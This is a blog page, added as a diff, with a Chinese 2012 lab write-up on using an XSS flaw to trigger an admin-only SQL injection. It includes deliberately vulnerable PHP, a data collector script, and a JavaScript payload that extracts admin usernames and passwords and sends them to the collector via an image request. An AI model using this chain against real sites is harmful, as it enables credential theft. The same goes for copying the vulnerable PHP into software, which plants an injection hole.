@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sql注入,xss," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="昨天看见phpcms v9.1.15爆的xss和无权限的sql注入，于是就想测试下利用xss执行sql注入，虽然爆的这个phpcms漏洞还有很多其他的用法！但是，这个注入我没有找到phpcms v9.1.15测试，其他版本都没有测试成功！ 于是乎我只有假想下一个极端环境： 1.前台有且只有一个xss漏洞（不能获取管理员cookie） 2.后台有且只有一个sql注入漏洞（注入漏洞文件只有管理员可以访">
+<meta name="keywords" content="sql注入,xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用xss 执行sql注入">
+<meta property="og:url" content="http://yoursite.com/2012/08/03/利用xss-执行sql注入/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="昨天看见phpcms v9.1.15爆的xss和无权限的sql注入，于是就想测试下利用xss执行sql注入，虽然爆的这个phpcms漏洞还有很多其他的用法！但是，这个注入我没有找到phpcms v9.1.15测试，其他版本都没有测试成功！ 于是乎我只有假想下一个极端环境： 1.前台有且只有一个xss漏洞（不能获取管理员cookie） 2.后台有且只有一个sql注入漏洞（注入漏洞文件只有管理员可以访">
+<meta property="og:image" content="http://yoursite.com/201208/604cce3b2cdd8d5022ef3310e8467df2201208031709471630019655.jpg">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.268Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用xss 执行sql注入">
+<meta name="twitter:description" content="昨天看见phpcms v9.1.15爆的xss和无权限的sql注入，于是就想测试下利用xss执行sql注入，虽然爆的这个phpcms漏洞还有很多其他的用法！但是，这个注入我没有找到phpcms v9.1.15测试，其他版本都没有测试成功！ 于是乎我只有假想下一个极端环境： 1.前台有且只有一个xss漏洞（不能获取管理员cookie） 2.后台有且只有一个sql注入漏洞（注入漏洞文件只有管理员可以访">
+<meta name="twitter:image" content="http://yoursite.com/201208/604cce3b2cdd8d5022ef3310e8467df2201208031709471630019655.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2012/08/03/利用xss-执行sql注入/"/>
+
+
+
+
+
+  <title>利用xss 执行sql注入 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2012/08/03/利用xss-执行sql注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">利用xss 执行sql注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2012-08-03T17:00:18+08:00">
+                2012-08-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HTML-CSS-JS-xss-xml/" itemprop="url" rel="index">
+                    <span itemprop="name">HTML|CSS|JS|xss|xml</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>昨天看见phpcms v9.1.15爆的xss和无权限的sql注入，于是就想测试下利用xss执行sql注入，虽然爆的这个phpcms漏洞还有很多其他的用法！但是，这个注入我没有找到phpcms v9.1.15测试，其他版本都没有测试成功！</p>
+<p>于是乎我只有假想下一个极端环境：</p>
+<p>1.前台有且只有一个xss漏洞（不能获取管理员cookie）</p>
+<p>2.后台有且只有一个sql注入漏洞（注入漏洞文件只有管理员可以访问）</p>
+<p>3.注入获得管理员密码可解密</p>
+<p>4.除以上无其他任何漏洞（包括后台getwebshell）</p>
+<p>其实我就是想说，我们只可以利用这个xss执行注入！</p>
+<p>&nbsp;</p>
+<p>模拟注入漏洞代码</p>
+<p>sqli.php</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php
+ @error_reporting (E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);//错误忽略
+ $con = mysql_connect("localhost","root","");
+ if(!$con) {die(’Could not connect: ’ . mysql_error());}
+ mysql_select_db("test",$con);
+ $id = $_GET[’xss’];
+ $sql = "select id,realname from test where id="."$id";
+ $view = mysql_query($sql);
+ $row = mysql_fetch_array($view);
+ echo $row[id]."&lt;br /&gt;";
+ echo $row[realname]."&lt;br /&gt;";
+?&gt;</pre> 
+
+<p>&nbsp;</p>
+<p>mysql数据库：</p>
+<pre class="brush:sql; toolbar: true; auto-links: true;">database：test
+table：test、admin
+column：test.id、test.realname
+             admin.id、admin.username、admin.password</pre> 
+
+<p>&nbsp;</p>
+<p>get.php（获取的注入后数据截取）</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php 
+ $file = fopen("data.txt","a");
+ fwrite($file,$_GET[’get’]);
+ fclose($file);
+?&gt;</pre> 
+
+<p>&nbsp;</p>
+<p>xsssqli.js（payload）</p>
+<pre class="brush:js; toolbar: true; auto-links: true;">function addLoadEvent(func)//窗口打开加载多个函数
+{ 
+ var oldfunc=window.onload; //页面打开是加载方法
+    if(typeof(window.onload)!="function")
+    { 
+     window.onload=func;
+    }
+    else
+    { 
+     window.onload=function()
+     {
+      oldfunc(); 
+      func(); 
+      } 
+     } 
+}
+function get_xsssqli()
+{
+ var url = "http://127.0.0.1/xss/sqli.php?xss=1%20and%201=2%20union%20select%20username,password%20from%20admin";
+ var ajax = null;
+ if(window.XMLHttpRequest)
+ { 
+  ajax = new XMLHttpRequest();
+ }
+ else if(window.ActiveXObject)
+ { 
+  ajax = new ActiveXObject("Microsoft.XMLHTTP");//ie6和一下老版本
+ }
+ else
+ { 
+  return;
+ }
+ ajax.open("GET", url, true);
+ ajax.send(null);
+ ajax.onreadystatechange = function()
+ {
+  if(ajax.readyState == 4 &amp;&amp; ajax.status == 200)
+  {
+   var img = document.createElement("img");
+   img.src = "http://127.0.0.1/xss/get.php?get="+ajax.responseText;
+   document.body.appendChild(img);
+  }
+ }
+}
+addLoadEvent(get_xsssqli);</pre> 
+
+<p>&nbsp;</p>
+<p>模拟xss漏洞</p>
+<pre class="brush:html; toolbar: true; auto-links: true;">&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;use xss to sqli&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+ &lt;script src=http://127.0.0.1/xss/get.js &gt;&lt;/script&gt;
+ &lt;/body&gt;
+&lt;/html&gt;</pre> 
+
+<p>&nbsp;</p>
+<p>最后成功得到数据:</p>
+<p><img src="/201208/604cce3b2cdd8d5022ef3310e8467df2201208031709471630019655.jpg" alt=""></p>
+<p>当然你也可以写个正则截获指定数据！</p>
+<p>转载请指明出处：L.N.博客&nbsp; <a href="http://lanu.sinaapp.com/htmlcssjisxml/112.html" target="_blank" rel="noopener">http://lanu.sinaapp.com/htmlcssjisxml/112.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
+          
+            <a href="/tags/xss/" rel="tag"># xss</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2012/08/01/【转】细谈Web系统安装程序安全/" rel="next" title="【转】细谈Web系统安装程序安全">
+                <i class="fa fa-chevron-left"></i> 【转】细谈Web系统安装程序安全
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2012/09/16/关于mysql报错注入的几个语句【记录】/" rel="prev" title="关于mysql报错注入的几个语句【记录】">
+                关于mysql报错注入的几个语句【记录】 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
